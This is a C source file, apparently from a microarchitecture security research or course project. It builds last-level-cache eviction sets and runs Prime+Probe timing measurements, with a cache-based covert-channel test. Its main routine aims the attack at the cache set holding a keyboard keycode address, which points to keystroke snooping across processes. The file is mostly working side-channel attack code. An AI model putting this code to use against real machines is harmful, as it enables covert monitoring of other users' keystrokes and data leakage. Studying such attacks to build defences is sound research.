#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../lib/constants.h"
#include "../lib/covert.h"
#include "../lib/eviction.h"
#include "../lib/utils.h"

#define TRIALS 1000
#define WAIT_INTERVAL 100000

void *mapping_start;
EvictionSet **es_list;
unsigned int core_id = 0;
FILE *file;

void cleanup(EvictionSet **es_listl, void *mapping_start, FILE *file) {
  fclose(file);
  free_es_list(es_list);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}
void handle_sigint(int sig) {
  safe_print("SIGINT received, cleanup process initiated\n");
  cleanup(es_list, mapping_start, file);
  exit(1);
}

void prime_probe_once(EvictionSet *es, int *times) {
  access_set(es);
  int start = __rdtscp(&core_id);
  while (__rdtscp(&core_id) - start < WAIT_INTERVAL)
    ;
  probe(es, times);
}

void test_eviction_set(void) {
  uint8_t victim = 0x37;
  CacheLineSet *cl_set = new_cl_set();

  uint64_t threshold = threshold_from_flush(&victim);
  if (!get_minimal_set(&victim, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  // Bring the victim into the cache
  uint8_t var2 = victim ^ 0xF7;

  // Access eviction set
  NumList *timings = new_num_list(TRIALS);
  evict_and_time(cl_set, &victim, timings, true);

  // Report median and mean times
  printf("Timings after accessing eviction set:\n");
  print_stats(timings);

  int evictions = 0;

  for (int i = 0; i < TRIALS; i++) {
    if (timings->nums[i] > threshold) {
      evictions++;
    }
  }

  printf("Successfully evicted %u/%u trials.\n", evictions, TRIALS);

  deep_free_cl_set(cl_set);
  free_num_list(timings);
}

void test_covert_channel(void) {
  uint8_t *target = malloc(sizeof(uint64_t *));
  printf("target: %p\n", target);
  CacheLineSet *cl_set = new_cl_set();
  int threshold = threshold_from_flush(target);
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  EvictionSet *evset = new_eviction_set(cl_set);
  for (int i = 0; i < 26; i++) {
    char c = 'a' + i;
    char recv = 0;
    for (int j = 0; j < 8; j++) {
      int bit = c & 0x1;
      send_bit(bit, evset);
      recv += recv_bit(target, threshold) << j;
      printf("%d ", bit);
      c >>= 1;
    }
    printf("%c\n", recv);
  }
  // deep_free_cl_set(cl_set);
  // deep_free_es(evset);
}

void test_eviction_and_pp(void) {
  uint8_t *target = malloc(sizeof(uint8_t *));
  printf("target: %p\n", target);
  uintptr_t pa = pointer_to_pa(target);

  // map 64 2 MB pages to ge 256 candidate lines
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }

  printf("memory mapped: %p\n", mapping_start);

  int threshold = threshold_from_flush(target);

  CacheLineSet *cl_set;
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("unable to obtain eviction set\n");
  }

  for (int i = 0; i < cl_set->size; i++) {
    printf("%p\n", cl_set->cache_lines[i]);
  }

  EvictionSet *es = new_eviction_set(cl_set);
  uint64_t time = evict_and_time_once(es, target);
  printf("threshold: %d, evict_time: %ld\n", threshold, time);

  sleep(1);

  access_set(es);
  volatile uint8_t tmp = *target;
  int list[16];
  probe(es, list);

  sleep(1);
  access_set(es);
  probe(es, list);

  free(target);
  deep_free_es(es);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}

void find_all_eviction_sets(int set) {
  printf("set: %d\n", set);
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }
  es_list = get_all_slices_eviction_sets(mapping_start, set);

  for (int i = 0; i < 4; i++) {
    printf("Eviction Set %d: \n", i);
    print_eviction_set(es_list[i]->cache_lines);
  }
}

int get_eslist_index_for_target(uintptr_t target) {
  int ret = -1;
  for (int i = 0; i < 4; i++) {
    CacheLine *iter = es_list[i]->head;
    printf("%d ", get_i7_2600_slice(pointer_to_pa((void *)iter)));
    if (2 == get_i7_2600_slice(pointer_to_pa((void *)iter))) {
      ret = i;
    }
  }
  printf("\n");
  return ret;
}

void prime_probe(int slice_idx) {
  int threshold = threshold_from_flush((void *)es_list[slice_idx]->head);

  printf("prime+probe starts here: \n");
  sleep(3);

  int times[16];
  uint8_t hit_times[1024 * 1024];
  for (int i = 0; i < 1024 * 1024; i++)
    hit_times[i] = 0;

  printf("start time: %llu\n", __rdtscp(&core_id));
  for (int i = 0; i < 1024 * 1024; i++) {
    prime_probe_once(es_list[slice_idx], times);
    for (int j = 0; j < 16; j++) {
      if (times[j] > threshold) {
        hit_times[i] = 1;
        break;
      }
    }
  }

  printf("prime+probe period ends\n");
  for (int i = 0; i < 64; i++) {
    for (int j = 0; j < 64; j++) {
      printf("%d", hit_times[1024 * 1024 - 64 * 64 + i * 64 + j]);
    }
    printf("\n");
  }
}

int main() {
  signal(SIGINT, handle_sigint);
  // test_eviction_set();
  // test_covert_channel();
  // test_eviction_and_pp();
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  find_all_eviction_sets(set);
  // CacheLineSet *cl_set =
  //     hugepage_inflate(mapping_start + EVERGLADES_LLC_SIZE, 16, 428);
  // volatile uint8_t tmp = *(volatile uint8_t *)mapping_start;
  // for (int i = 0; i < cl_set->size; i++) {
  //   for (int j = 0; j < 4; j++) {
  //     int time =
  //         evict_and_time_once(es_list[j], (uint8_t *)cl_set->cache_lines[i]);
  //     printf("addr %d, slice %d: %d\n", i, j, time);
  //   }
  // }
  // printf("prime+probe starts\n");
  // sleep(1);
  // nl = new_num_list(16);
  int index = get_eslist_index_for_target(KBD_KEYCODE_ADDR);
  printf("index: %d\n", index);
  // while (1) {
  //   // for (int i = 0; i < 4; i++) {
  //   //   prime_probe_once(es_list[i], nl);
  //   //   clear_num_list(nl);
  //   // }
  //   prime_probe_once(es_list[1], nl);
  //   clear_num_list(nl);
  // }

  char filename[9];
  for (int i = 0; i < 4; i++) {
    printf("testing slice index: %d\n", i);
    sleep(1);
    prime_probe(i);
  }
}
